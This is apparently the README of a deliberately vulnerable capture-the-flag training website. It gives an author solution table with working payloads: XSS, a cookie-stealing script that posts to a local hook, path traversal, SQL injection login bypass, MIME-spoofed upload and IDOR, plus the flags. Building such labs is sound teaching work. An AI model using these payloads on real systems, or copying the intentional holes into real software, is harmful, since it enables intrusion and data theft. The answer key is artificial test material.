# Cyber Bangla CTF Platform

A realistic cybersecurity company website secretly containing 10 web security challenges. Built with Node.js + Express + EJS.

---

## Quick Start

```bash
npm install
node server.js
# Open http://localhost:3000
```

---

## Architecture Overview

```
CBCTF/
├── server.js               ← Express app entry point
├── package.json
├── routes/
│   ├── main.js             ← Main website pages
│   ├── robots_route.js     ← Challenge 2: robots.txt chain
│   ├── xss_basic.js        ← Challenge 3a: Reflected XSS
│   ├── xss_medium.js       ← Challenge 3b: Stored XSS + admin bot
│   ├── xss_high.js         ← Challenge 3c: Stored DOM XSS + Auth Bypass
│   ├── upload.js           ← Challenge 4: File upload bypass
│   ├── info_leak.js        ← Challenge 5: Information disclosure (×3)
│   ├── lfi.js              ← Challenge 6: Local File Inclusion
│   └── idor.js             ← Challenge 8: Insecure Direct Object Reference
├── views/
│   ├── flag.txt            ← [CHALLENGE 6 FLAG]
│   ├── partials/           ← EJS head/nav/footer partials
│   ├── pages/              ← Static content for LFI challenge
│   ├── index.ejs           ← Home page (hidden flag in source)
│   ├── blog.ejs            ← Blog with comment section (Stored XSS)
│   └── ...                 ← About, Services, Academy, Contact, 404
├── public/
│   ├── css/style.css       ← Dark cyber theme
│   ├── js/main.js          ← Particles, nav, counters
│   ├── js/dev.js           ← [CHALLENGE 2 FLAG]
│   └── uploads/            ← File upload destination
└── flags/
    └── README.txt          ← Flag index for challenge authors
```

---

## Challenge Solutions (Author Reference)

| # | Challenge | How to Find | Flag |
|---|-----------|-------------|------|
| 1 | **View Source** | `Ctrl+U` on home page → search for `CBCTF` | `CBCTF{view_source_flag}` |
| 2 | **robots.txt** | `/robots.txt` → `/admin` → check source for `/js/dev.js` → read the file | `CBCTF{robots_js_flag}` |
| 3a | **XSS Basic** | `/academy/search?q=<script>alert(document.cookie)</script>` | `CBCTF{basic_xss_pwned}` |
| 3b | **XSS Medium** | Post comment: `<script>fetch('/xss/hook?d='+btoa(document.cookie))</script>` → `/xss/trigger-bot` → `/xss/hook/log` → decode base64 | `CBCTF{stored_xss_pwned}` |
| 3c | **XSS High** | Visit `/debug/info` → find admin credentials (admin:Cyber@2024) → Go to `/issues` → submit issue with DOM XSS payload in title/description: `<svg onload="alert(flag)">` or `<img src=x onerror="alert(flag)">` → Click "Admin Panel" → enter Basic Auth → DOM payload executes on innerHTML rendering → flag alerts | `CBCTF{dom_xss_executed}` |
| 4 | **File Upload** | POST to `/profile/upload` with any file but `Content-Type: image/jpeg`. Files auto-delete after 3 minutes. | `CBCTF{upload_bypass_success}` |
| 5a | **Info Leak (log)** | `GET /admin/log` | `CBCTF{log_file_leak}` |
| 5b | **Info Leak (base64)** | `GET /internal/dev` → decode `data` field from Base64 | `CBCTF{internal_dev_flag}` |
| 5c | **Info Leak (debug)** | `GET /debug/info` → read `flag` field in JSON | `CBCTF{debug_info_exposed}` |
| 6 | **LFI** | `GET /academy/content?page=../../flag.txt` | `CBCTF{lfi_file_read}` |
| 7 | **SQL Injection** | POST /login with username: `admin' OR '1'='1 --` | `CBCTF{sql_injection_success}` |
| 8 | **IDOR** | GET /user/1, /user/2, /user/3 | `CBCTF{idor_vulnerability}` |

---

## Challenge Details

### Challenge 1: View Source
**Description:** The simplest challenge. Find the hidden flag by viewing the page source code of the home page.
**Hint:** Press Ctrl+U (or right-click → View Page Source) and search for "CBCTF".

### Challenge 2: robots.txt
**Description:** Discover hidden paths using robots.txt, then find a development file containing the flag.
**Hint:** Check /robots.txt first, then look for /admin, and examine the page source for JavaScript files.

### Challenge 3a: XSS Basic (Reflected)
**Description:** Basic reflected XSS vulnerability in the academy search function.
**Hint:** Try injecting `<script>alert(1)</script>` in the search query parameter.

### Challenge 3b: XSS Medium (Stored)
**Description:** Stored XSS in the blog comment system with an admin bot that visits comments.
**Hint:** Post a comment with a script that exfiltrates cookies to a hook endpoint, then trigger the admin bot.

### Challenge 3c: XSS High (DOM XSS + Auth Bypass)
**Description:** Advanced stored DOM XSS requiring authentication bypass. Submit malicious issues that execute when the admin views them.
**Hint:** Find admin credentials from info leak endpoints, submit DOM XSS payloads, then access the admin panel.

### Challenge 4: File Upload
**Description:** Bypass MIME type validation to upload non-image files that get executed by the browser.
**Hint:** Upload any file but set Content-Type to image/jpeg. Files auto-delete after 3 minutes.

### Challenge 5a: Info Leak (log)
**Description:** Access a hidden admin log endpoint that reveals sensitive information.
**Hint:** Try common admin paths like /admin/log.

### Challenge 5b: Info Leak (base64)
**Description:** Decode base64 encoded data from an internal development endpoint.
**Hint:** Visit /internal/dev and decode the 'data' field.

### Challenge 5c: Info Leak (debug)
**Description:** Access debug information endpoint containing various secrets including flags.
**Hint:** Try /debug/info or similar debug paths.

### Challenge 6: LFI
**Description:** Local File Inclusion vulnerability allowing reading of server files via path traversal.
**Hint:** Use `../../` to traverse directories from the academy content viewer.

### Challenge 7: SQL Injection
**Description:** SQL Injection vulnerability in the login form allowing authentication bypass.
**Hint:** Use SQL injection in the username field to bypass login and get the flag.

### Challenge 8: IDOR
**Description:** Insecure Direct Object Reference allowing unauthorized access to other users' data.
**Hint:** Try accessing different user IDs in the URL to find sensitive information.

---

## Security Isolation Notes

Each challenge is sandboxed:

- **XSS**: Flags are scoped per challenge — the `xss_basic_flag` cookie uses `path=/academy`, LFI flag lives only in `flags/` (not served statically), uploaded files go to `public/uploads/` which cannot access `flags/`. **Challenge 3c** is Stored DOM XSS requiring Basic Auth (credentials leaked in `/debug/info`). Issues are rendered via `innerHTML` without sanitisation, so payloads execute when admin visits the panel.
- **File Upload**: `multer` storage is restricted to `public/uploads/`. Challenge flags are in `flags/` which has no static serving rule.
- **LFI**: Path traversal from `views/pages/` to `views/flag.txt` via `../../flag.txt`. Challenge flags 1–5 are inline/in-memory, not files accessible via LFI traversal.
- **Stored XSS**: Challenge 3b hook log is an in-memory array in `xss_medium.js`, never persisted to disk, never readable via LFI. Challenge 3c issues are in-memory array with per-player isolation.
- **Info Leak**: Flags 5a/5b/5c are hard-coded strings in route handlers, not file reads. Challenge 3c admin credentials are also leaked in `/debug/info`.
- **SQL Injection**: User data stored in SQLite database with vulnerable queries in `routes/auth.js`. Flag displayed on login page after successful SQLi bypass. No prepared statements used.
- **IDOR**: User data accessible via direct URL parameters in `routes/idor.js` without authentication or authorization checks.

---

## Customisation

- Change port: `PORT=8080 node server.js`
- Change flags: Edit each route file and `flag.txt` (root) or challenge-specific files
- Add hints: Edit the corresponding EJS view file
